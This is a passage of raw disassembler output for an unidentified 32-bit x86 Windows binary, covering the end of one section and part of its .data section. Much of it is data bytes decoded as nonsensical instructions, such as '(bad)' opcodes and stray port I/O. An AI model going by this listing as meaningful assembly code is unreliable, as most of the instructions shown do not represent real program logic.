  41ccb7:	push   ss
  41ccb8:	dec    ecx
  41ccb9:	xchg   esi,eax
  41ccba:	sub    bh,BYTE PTR [esp+ebp*2]
  41ccbd:	jae    0x41cc63
  41ccbf:	sub    DWORD PTR [edx+0x6e],edx
  41ccc2:	fs dec ebp
  41ccc4:	jns    0x41ccf4
  41ccc6:	loopne 0x41cd11
  41ccc8:	lds    eax,FWORD PTR [edx+0x24]
  41cccb:	mov    ah,bl
  41cccd:	add    eax,0x2ac0aec4
  41ccd2:	test   al,0x40
  41ccd4:	push   cs
  41ccd5:	(bad)  
  41ccd6:	loope  0x41cd44
  41ccd8:	sbb    al,0xae
  41ccda:	fistp  DWORD PTR [ebx+esi*4]
  41ccdd:	fiadd  WORD PTR [bp-0x20]
  41cce1:	lds    ecx,FWORD PTR [eax-0x4b]
  41cce4:	inc    ebx
  41cce5:	xor    al,0xfc
  41cce7:	aam    0x1d
  41cce9:	push   es
  41ccea:	xor    BYTE PTR fs:[ecx-0x2afd150b],bl
  41ccf1:	iret   
  41ccf2:	push   0xffffffc2
  41ccf4:	and    edi,DWORD PTR [edi-0x46285eee]
  41ccfa:	adc    BYTE PTR [eax+0x2b1994ee],ch
  41cd00:	inc    ecx
  41cd01:	jo     0x41cce2
  41cd03:	fsubr  QWORD PTR [edx-0x34]
  41cd06:	sti    
  41cd07:	sub    esi,DWORD PTR [edx]
  41cd09:	jle    0x41ccb7
  41cd0b:	shr    BYTE PTR [ebp+0x6ff6ac95],1
  41cd11:	fmul   DWORD PTR [ecx]
  41cd13:	iret   
  41cd14:	icebp  
  41cd15:	leave  
  41cd16:	sbb    cl,ah
  41cd18:	jno    0x41cd42
  41cd1a:	xor    DWORD PTR [esi-0x54],ecx
  41cd1d:	and    edx,esi
  41cd1f:	arpl   WORD PTR [edi],si
  41cd21:	lods   eax,DWORD PTR ds:[esi]
  41cd22:	into   
  41cd23:	push   eax
  41cd24:	das    
  41cd25:	sbb    al,0xbc
  41cd27:	outs   dx,DWORD PTR ds:[esi]
  41cd28:	sahf   
  41cd29:	dec    edx
  41cd2a:	mov    dl,0x8a
  41cd2c:	in     eax,0xb9
  41cd2e:	out    0x8b,eax
  41cd30:	imul   esp
  41cd32:	dec    ebx
  41cd33:	fimul  DWORD PTR [esi]
  41cd35:	outs   dx,DWORD PTR ds:[esi]
  41cd36:	mov    ah,0x3b
  41cd38:	pop    es
  41cd39:	xor    al,0xad
  41cd3b:	repz leave 
  41cd3d:	aas    
  41cd3e:	dec    ebp
  41cd3f:	std    
  41cd40:	or     eax,edi
  41cd42:	shr    BYTE PTR [edi+eax*1+0x7864e477],1
  41cd49:	dec    esi
  41cd4a:	repz pop edx
  41cd4c:	pop    ss
  41cd4d:	and    al,0x99
  41cd4f:	xchg   edx,eax
  41cd50:	jge    0x41ccd4
  41cd52:	inc    ebp
  41cd53:	out    0x4a,al
  41cd55:	scas   al,BYTE PTR es:[edi]
  41cd56:	add    ebx,DWORD PTR [ebx+0xe]
  41cd59:	loop   0x41cd7e
  41cd5b:	cld    
  41cd5c:	mov    edi,0xfae45589
  41cd61:	adc    eax,0x301b9faf
  41cd66:	(bad)  
  41cd67:	loop   0x41cde7
  41cd69:	pop    ebx
  41cd6a:	leave  
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
